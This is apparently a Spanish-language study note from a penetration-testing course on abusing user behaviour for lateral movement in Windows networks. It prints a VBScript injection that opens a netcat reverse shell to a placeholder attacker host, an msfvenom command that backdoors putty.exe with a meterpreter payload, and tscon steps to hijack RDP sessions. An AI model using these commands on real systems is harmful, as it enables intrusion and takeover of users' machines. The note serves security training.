---
layout: apunte
title: "5. Abusing User Behaviour"
---

Bajo ciertas circunstancias, un atacante puede aprovecharse de las acciones realizadas por los usuarios para obtener más acceso a las máquinas de la red. Aunque hay varias maneras de las que puede suceder, veremos algunas de las más comunes.

-------------------------------
<h2>Abusando de Comparticiones Escribibles</h2>
Es bastante común encontrar comparticiones de red que usuarios legítimos usan para realizar tareas del día a día al comprobar entornos corporativos. Si esas comparticiones son escribibles por alguna razón, algún atacante podría plantar archivos para forzar a los usuarios a ejecutar un payload arbitrario y ganar acceso a sus máquinas.

Un escenario común consiste en encontrar un atajo a un script o archivo ejecutable hosteado en una compartición de red:

!**Pasted image 20260913191258.png**

El sentido de esto es que el administrador puede mantener un ejecutable en una compartición de red, y los usuarios pueden ejecutarla sin copiar o instalar la aplicación en cada usuario. Si como atacantes tenemos permisos de escritura sobre dichos archivos o ejecutables, podemos implantar una backdoor para forzar a los usuarios a ejecutar cualquier payload que queramos.

Aunque el script o ejecutable está hosteado en el servidor, cuando un usuario abre el atajo en su máquina, el ejecutable será copiado desde el servidor a su directorio `%temp%` y ejecutado en su estación de trabajo. Por eso, cualquier payload será ejecutado en el contexto del usuario que lo ejecute.

-------------------------------------
<h2>Backdooring Archivos .vbs</h2>
Como ejemplo, si el recurso compartido es un script VBS, podemos poner una copia de `nc64.exe` en la misma compartición e inyectar el siguiente código en el script compartido:

```VBScript
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <ATTACKER_IP> 1234", 0, True
```

Esto copiará `nc64.exe` desde la compartición en el directorio `%tmp%` de la estación de trabajo del usuario y mandará una reverse shell de vuelta al atacante cuando el usuario abra el script VBS en la compartición.

--------------------------------
<h2>Backdooring Archivos .exe</h2>
Si el archivo compartido es un binario de Windows, por ejemplo `putty.exe`, puedes descargarlo desde la compartición y usar msfvenom para inyectar una backdoor en él. El binario funcionará de manera usual pero además ejecutará el payload silenciosamente. Para crear el `putty.exe` backdooreado, podemos usar el siguiente comando:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<ATTACKER_IP> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

El archivo `puttyX.exe` resultante ejecutará un payload meterpreter reverse_tcp sin que el usuario se de cuenta. Una vez que el archivo ha sido generado, podemos reemplazar el ejecutable en la compartición de windows y esperar conexiones usando el módulo `exploit/multi/handler`.

-----------------------------------------
<h2>Secuestrando RDP</h2>
Cuando un administrador usa Remote Desktop para conectarse a una máquina y cierra el cliente RDP en vez de cerrar sesión, su sesión sigue activa en el servidor indefinidamente. Si tienes privilegios SYSTEM en Windows Server 2016 y versiones anteriores, puedes hacerte con la sesión sin requerir contraseña.

Si tenemos acceso de nivel de administrador, podemos obtener SYSTEM con cualquier método de nuestra preferencia. Por ahora, estaremos usando `psexec` para hacerlo. Primero ejecutamos `cmd.exe` como administrador:

!**Pasted image 20260913192914.png**

Desde ahí, ejecutamos `PsExec64.exe`:

```cmd
PsExec64.exe -s cmd.exe
```

Para listar las sesiones existentes en un servidor, puedes usar el siguiente comando:

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 >administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
  luke                                    3  Disc            .  4/6/2022 6:51 AM
```

De acuerdo con el output de ariba si estamos actualmente conectados vía RDP usando el usuario administrator, nuestro SESSIONNAME debería ser `rdp-rcp#6`. También podemos ver que un usuario llamado luke ha dejado la sesión abierta con un id `3`. Cualquier sesión con estado "**Disc**" ha sido dejada abierta por el usuario y no está siendo usada actualmente. Aunque puedes hacerte con las sesiones activas, el usuario legítimo será expulsado de su sesión cuando lo hagas, por lo que podrían notarlo.

Para conectarse a una sesión, usaremos `tscon.exe` y especificaremos el ID y nuestro actual SESSIONNAME. Siguiendo el ejemplo anterior, para tomar control de la sesión de luke, usaríamos el siguiente comando:

```cmd
tscon 3 /dest:rdp-tcp#6
```

En términos simples, el comando dice que la sesión `3`, propiedad de luke, debería ser conectada con la sesión RDP `rdp-tcp#6`, propiedad del usuario administrator.

Como resultado, continuaremos la sesión RDP de luke conectándonos inmediatamente.

>[!CAUTION] Windows Server 2019 no te permitirá conectarte a la sesión de otro usuario  sin conocer su contraseña.

